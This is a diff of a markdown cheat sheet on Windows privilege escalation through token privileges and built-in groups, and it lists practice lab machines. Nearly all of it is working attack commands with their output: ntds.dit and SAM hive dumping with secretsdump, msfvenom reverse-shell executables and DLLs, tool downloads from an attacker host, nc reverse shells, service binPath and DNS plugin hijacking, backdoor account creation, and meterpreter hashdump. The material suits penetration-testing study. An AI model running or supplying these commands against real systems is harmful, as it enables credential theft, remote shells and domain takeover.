@@ -1,7 +1,23 @@
+# Table of Contents
+
+- [Privileges](#privileges)
+  - [SeBackupPrivilege](#sebackupprivilege)
+  - [SeLoadDriverPrivilege](#seloaddriverprivilege)
+  - [SeImpersonatePrivilege](#seimpersonateprivilege)
+  - [SeDebugPrivilege](#sedebugprivilege)
+  - [SeTcbPrivilege](#setcbprivilege)
+- [Built-in Groups](#built-in-groups)
+  - [Backup Operators](#backup-operators)
+  - [Server Operators](#server-operators)
+  - [Account Operators](#account-operators)
+  - [DnsAdmins](#dnsadmins)
+- [Resources](#resources)
+- [Practice](#practice)
+
 # Privileges
-## SeBackupPrivilege
-```powershell
-*Evil-WinRM* PS C:\Users\Caroline.Robinson\Documents> whoami /priv
+### SeBackupPrivilege
+```
+> whoami /priv
 
 PRIVILEGES INFORMATION
 ----------------------
@@ -13,24 +29,18 @@ SeBackupPrivilege             Back up files and directories  Enabled
 ...
 ```
 ### Disk Shadow method
+pwn.txt file content
 ```
 set context persistent nowriters 
 add volume c: alias pwn 
 create 
 expose %pwn% z: 
 ```
-```powershell
-*Evil-WinRM* PS C:\temp> upload pwn.txt
 ```
-```powershell
-*Evil-WinRM* PS C:\temp> type pwn.txt
-set context persistent nowriters 
-add volume c: alias pwn 
-create 
-expose %pwn% z: 
+> upload pwn.txt
 ```
-```powershell
-*Evil-WinRM* PS C:\temp> diskshadow /s pwn.txt
+```
+> diskshadow /s pwn.txt
 Microsoft DiskShadow version 1.0
 Copyright (C) 2013 Microsoft Corporation
 On computer:  BABYDC,  8/9/2024 10:57:34 PM
@@ -61,8 +71,8 @@ Number of shadow copies listed: 1
 The shadow copy was successfully exposed as z:\.
 ->
 ```
-```powershell
-*Evil-WinRM* PS C:\temp> robocopy /b z:\windows\ntds . ntds.dit
+```
+> robocopy /b z:\windows\ntds . ntds.dit
 
 -------------------------------------------------------------------------------
    ROBOCOPY     ::     Robust File Copy for Windows
@@ -81,52 +91,52 @@ The shadow copy was successfully exposed as z:\.
                            1    z:\windows\ntds\
             New File              16.0 m        ntds.dit
 
-[snipped]
+[SNIP]
 ```
-```powershell
-*Evil-WinRM* PS C:\temp> reg save HKLM\SYSTEM c:\temp\system
+```
+> reg save HKLM\SYSTEM c:\temp\system
 The operation completed successfully.
 ```
-```powershell
-*Evil-WinRM* PS C:\temp> download system
+```
+> download system
 
 Info: Downloading C:\temp\system to system
 
 Info: Download successful!
 ```
-```powershell
-*Evil-WinRM* PS C:\temp> download ntds.dit
+```
+> download ntds.dit
 
 Info: Downloading C:\temp\ntds.dit to ntds.dit
 
 Info: Download successful!
 ```
 ```
-➜  secretsdump.py -system system -ntds ntds.dit local
+$ secretsdump.py -system system -ntds ntds.dit local
 ```
 ## SeLoadDriverPrivilege
 -> https://github.com/k4sth4/SeLoadDriverPrivilege
-```bash
-➜  msfvenom -p windows/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f exe -o shell.exe
 ```
-```powershell
-*Evil-WinRM* PS C:\temp> upload Capcom.sys
-*Evil-WinRM* PS C:\temp> upload ExploitCapcom.exe
-*Evil-WinRM* PS C:\temp> upload eoploaddriver_x64.exe
-*Evil-WinRM* PS C:\temp> upload shell.exe
+$ msfvenom -p windows/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f exe -o shell.exe
 ```
-```powershell
-*Evil-WinRM* PS C:\temp> .\eoploaddriver_x64.exe System\CurrentControlSet\dfserv C:\temp\Capcom.sys
 ```
-```powershell
-*Evil-WinRM* PS C:\temp> .\ExploitCapcom.exe LOAD \temp\Capcom.sys
+> upload Capcom.sys
+> upload ExploitCapcom.exe
+> upload eoploaddriver_x64.exe
+> upload shell.exe
 ```
-```powershell
-*Evil-WinRM* PS C:\temp> .\ExploitCapcom.exe EXPLOIT .\shell.exe
+```
+> .\eoploaddriver_x64.exe System\CurrentControlSet\dfserv C:\temp\Capcom.sys
+```
+```
+> .\ExploitCapcom.exe LOAD \temp\Capcom.sys
+```
+```
+> .\ExploitCapcom.exe EXPLOIT .\shell.exe
 ```
 ## SeImpersonatePrivilege
-```powershell
-C:\Windows\system32>whoami /priv
+```
+> whoami /priv
 
 PRIVILEGES INFORMATION
 ----------------------
@@ -137,11 +147,11 @@ Privilege Name                Description                               State
 SeImpersonatePrivilege        Impersonate a client after authentication Enabled
 ...
 ```
-```powershell
-PS C:\programdata> iwr http://<tun0>/GodPotato-NET4.exe -outfile gp.exe
 ```
-```powershell
-PS C:\programdata> .\gp.exe -cmd "C:\Users\Public\nc64.exe -e cmd.exe <tun0> <port>"
+> iwr http://<attacker_ip>/GodPotato-NET4.exe -outfile gp.exe
+```
+```
+> .\gp.exe -cmd "C:\Users\Public\nc64.exe -e cmd.exe <attacker_ip> <port>"
 [*] CombaseModule: 0x140733127524352
 [*] DispatchTable: 0x140733130111304
 [*] UseProtseqFunction: 0x140733129406688
@@ -168,25 +178,37 @@ PS C:\programdata> .\gp.exe -cmd "C:\Users\Public\nc64.exe -e cmd.exe <tun0> <po
 [*] CurrentUser: NT AUTHORITY\SYSTEM
 [*] process start with pid 3040
 ```
-```powershell
-➜  nc -nlvp 443
+```
+$ nc -nlvp 443
 listening on [any] 443 ...
-connect to [10.8.0.210] from (UNKNOWN) [10.10.150.182] 54910
-Microsoft Windows [Version 10.0.20348.2340]
-(c) Microsoft Corporation. All rights reserved.
 
-C:\programdata>whoami
+...
+
+> whoami
 nt authority\system
 ```
 ## SeDebugPrivilege
-```bash
-msfvenom -p windows/x64/meterpreter/reverse_tcp -ax64 -f exe LHOST=<ip> LPORT=<port> -o shell.exe
 ```
-```powershell
-PS C:\temp> iwr http://<ip>/shell.exe -outfile shell.exe
-PS C:\temp> .\shell.exe
+> whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                    State   
+============================= ============================== ========
+SeDebugPrivilege              Debug programs                 Enabled 
+SeChangeNotifyPrivilege       Bypass traverse checking       Enabled 
+SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
 ```
-```bash
+### Method 1
+```
+$ msfvenom -p windows/x64/meterpreter/reverse_tcp -ax64 -f exe LHOST=<ip> LPORT=<port> -o shell.exe
+```
+```
+> iwr http://<ip>/shell.exe -outfile shell.exe
+> .\shell.exe
+```
+```
 msf6 > use exploit/multi/handler
 [*] Using configured payload generic/shell_reverse_tcp
 msf6 exploit(multi/handler) > set lhost tun0
@@ -198,18 +220,52 @@ msf6 exploit(multi/handler) > exploit
 [*] Sending stage (200774 bytes) to <target_ip>
 [*] Meterpreter session 1 opened [SNIP]
 ```
-```bash
+```
 meterpreter > hashdump
 ```
-```bash
+```
 meterpreter > portfwd add -L 127.0.0.1 -l 445 -p 445 -r <target_ip>
 ```
-```bash
-impacket-smbexec administrator@127.0.0.1 -hashes :<hash>
 ```
+smbexec.py administrator@127.0.0.1 -hashes :<hash>
+```
+### Method 2
+```
+meterpreter > ps winlogon
+Filtering on 'winlogon'
+
+Process List
+============
+
+ PID  PPID  Name          Arch  Session  User                 Path
+ ---  ----  ----          ----  -------  ----                 ----
+ 548  468   winlogon.exe  x64   1        NT AUTHORITY\SYSTEM  C:\Windows\System32\winlogon.exe
+```
+```
+meterpreter > migrate 548
+[*] Migrating from 5036 to 548...
+
+[*] Migration completed successfully. 
+```
+```
+meterpreter > getuid
+Server username: NT AUTHORITY\SYSTEM
+```
+### Method 3
+Using: https://github.com/xct/adopt
+```
+> upload adopt.exe
+```
+```
+> .\adopt.exe vm3dservice.exe C:\windows\tasks\update.exe
+[>] Target pid is 2508
+[>] ShellExecuteExW is at 00007FFB7BF974A0
+[>] Thread running, done! (Handle: 100)
+```
+
 ## SeTcbPrivilege
-```bash
-*Evil-WinRM* PS C:\Users\svc_deploy\Documents> whoami /priv
+```
+> whoami /priv
 
 PRIVILEGES INFORMATION
 ----------------------
@@ -221,46 +277,68 @@ SeTcbPrivilege                Act as part of the operating system Enabled
 ...
 ```
 -> https://gist.github.com/antonioCoco/19563adef860614b56d010d92e67d178
-```powershell
-*Evil-WinRM* PS C:\Users\svc_deploy\Documents> iwr http://<tun0>/TcbElevation.exe -outfile TcbElevation.exe
 ```
--> https://github.com/xct/rcat
-```powershell
-*Evil-WinRM* PS C:\Users\svc_deploy\Documents> upload rcat_10.8.0.210_443.exe
+> curl http://<attacker_ip>/TcbElevation.exe -o TcbElevation.exe
+> curl http://<attacker_ip>/rcat_<attacker_ip>_443.exe -o rcat_<attacker_ip>_443.exe # https://github.com/xct/rcat
 ```
-```powershell
-*Evil-WinRM* PS C:\Users\svc_deploy\Documents> .\TcbElevation.exe pwn "C:\Windows\system32\cmd.exe /c C:\Users\svc_deploy\Documents\rcat_10.8.0.210_443.exe"
-Error starting service 1053
 ```
-```bash
-➜  rlwrap nc -nlvp 443
+> .\TcbElevation.exe pwn "C:\Windows\system32\cmd.exe /c C:\Users\svc_deploy\Documents\rcat_<attacker_ip>_443.exe"
+```
+```
+$ rlwrap nc -nlvp 443
 listening on [any] 443 ...
-connect to [10.8.0.210] from (UNKNOWN) [10.10.153.117] 53924
-Microsoft Windows [Version 10.0.20348.2113]
-(c) Microsoft Corporation. All rights reserved.
 
-C:\Windows\system32>whoami
+...
+
+> whoami
 nt authority\system
 ```
-# Groups
-## Server Operators Group
+# Built-in Groups
+## Backup Operators
+```
+$ smbserver.py -smb2support share share
+$ reg.py <domain>/<username>:<password>@<ip> backup -o '\\<attacker_ip>\share'
+
+...
+
+[*] Saved HKLM\SAM to \\10.10.14.8\share\SAM.save
+[*] Saved HKLM\SYSTEM to \\10.10.14.8\share\SYSTEM.save
+[*] Saved HKLM\SECURITY to \\10.10.14.8\share\SECURITY.save
+
+$ secretsdump.py local -sam SAM.save -system SYSTEM.save -security SECURITY.save
+```
+Or
+```
+> reg save hklm\sam sam      
+> download sam
+> reg save hklm\system system
+> download system
+```
+```
+$ secretsdump.py -sam sam -system system LOCAL
+```
+Or using the [back_operator](https://www.netexec.wiki/smb-protocol/obtaining-credentials/dump-backupop) module from NetExec
+```
+$ nxc smb <ip> -u <username> -p <password> -M backup_operator
+```
+## Server Operators
 Its members can sign-in to a server, start and stop services, access domain controllers, perform maintenance tasks (such as backup and restore), and they have the ability to change binaries that are installed on the domain controllers.
-```powershell
-*Evil-WinRM* PS C:\temp> net user svc-printer
+```
+> net user svc-printer
 ...
 Local Group Memberships      *Print Operators      *Remote Management Use
                              *Server Operators
 Global Group memberships     *Domain Users
 ```
-```powershell
-*Evil-WinRM* PS C:\temp> upload nc64.exe
 ```
-```powershell
-*Evil-WinRM* PS C:\temp> sc.exe config VMTools binPath="C:\temp\nc64.exe -e powershell.exe <tun0> <port>"
+> upload nc64.exe
+```
+```
+> sc.exe config VMTools binPath="C:\temp\nc64.exe -e powershell.exe <attacker_ip> <port>"
 [SC] ChangeServiceConfig SUCCESS
 ```
-```powershell
-*Evil-WinRM* PS C:\temp> sc.exe stop VMTools
+```
+> sc.exe stop VMTools
 
 SERVICE_NAME: VMTools
         TYPE               : 10  WIN32_OWN_PROCESS
@@ -270,36 +348,45 @@ SERVICE_NAME: VMTools
         CHECKPOINT         : 0x0
         WAIT_HINT          : 0x0
 ```
-```powershell
-*Evil-WinRM* PS C:\temp> sc.exe start VMTools
 ```
-```bash
-➜  rlwrap nc -nlvp 9001
+> sc.exe start VMTools
+```
+```
+$ rlwrap nc -nlvp 9001
 listening on [any] 9001 ...
-connect to [10.10.14.30] from (UNKNOWN) [10.10.11.108] 49634
-Windows PowerShell
-Copyright (C) Microsoft Corporation. All rights reserved.
 
-PS C:\Windows\system32> whoami
+...
+
+> whoami
 nt authority\system
 ```
-## DnsAdmins Group
--> https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/from-dnsadmins-to-system-to-domain-compromise
+## Account Operators
+This group can create and manage many non-admin accounts.
+```
+> net user meow P@ssw0rd /add
+> net localgroup IIS_IUSRS meow /add
+> net localgroup "Remote Management Users" meow /add
+```
+Now the user meow has the SeImpersonatePrivilege
+```
+> .\gp.exe -cmd "C:\programdata\nc64.exe -e cmd.exe <attacker_ip> 443"
+```
+## DnsAdmins
 When we are member of this group we can ask the machine to load an arbitrary DLL file when the service starts so that gives us RCE as SYSTEM. We can re-configure the service and we have the required privileges to restart it.
-```bash
-➜  msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f dll -o shell.dll
 ```
-```powershell
-*Evil-WinRM* PS C:\temp> upload shell.dll
+$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f dll -o shell.dll
 ```
-```powershell
-*Evil-WinRM* PS C:\temp> cmd /c 'dnscmd <DC> /config /serverlevelplugindll C:\temp\shell.dll'
+```
+> upload shell.dll
+```
+```
+> cmd /c 'dnscmd <DC> /config /serverlevelplugindll C:\temp\shell.dll'
 
 Registry property serverlevelplugindll successfully reset.
 Command completed successfully.
 ```
-```powershell
-*Evil-WinRM* PS C:\temp> sc.exe \\<DC> stop dns
+```
+> sc.exe \\<DC> stop dns
 
 SERVICE_NAME: dns 
         TYPE               : 10  WIN32_OWN_PROCESS  
@@ -310,8 +397,8 @@ SERVICE_NAME: dns
         CHECKPOINT         : 0x0
         WAIT_HINT          : 0x0
 ```
-```powershell
-*Evil-WinRM* PS C:\temp> sc.exe \\<DC> start dns
+```
+> sc.exe \\<DC> start dns
 
 SERVICE_NAME: dns 
         TYPE               : 10  WIN32_OWN_PROCESS  
@@ -324,11 +411,12 @@ SERVICE_NAME: dns
         PID                : 3500
         FLAGS
 ```
-```bash
-➜  rlwrap nc -nlvp 9001
+```
+$ rlwrap nc -nlvp 9001
+
 ...
 
-PS C:\Windows\system32> whoami
+> whoami
 nt authority\system
 ```
 # Resources
@@ -342,12 +430,15 @@ nt authority\system
 - https://snowscan.io/htb-writeup-blackfield/
 - https://snowscan.io/htb-writeup-resolute/
 - https://www.thehacker.recipes/a-d/movement/domain-settings/builtin-groups
+- https://www.thehacker.recipes/ad/movement/builtins/security-groups
 - https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/from-dnsadmins-to-system-to-domain-compromise
-## Machines to try:
-- Baby (Vulnlab)
-- Blackfield (HackTheBox)
-- Resolute (HackTheBox)
-- Fuse (HackTheBox)
-- POV (HackTheBox)
-- Job (Vulnlab)
-- Sidecar (Vulnlab)
+- https://web.archive.org/web/20230129100526/https://cube0x0.github.io/Pocing-Beyond-DA/
+- https://0xdf.gitlab.io/2024/06/08/htb-pov.html#exploit-sedebug
+## Practice
+- Baby
+- Blackfield
+- Resolute
+- Fuse
+- POV
+- Job
+- Sidecar
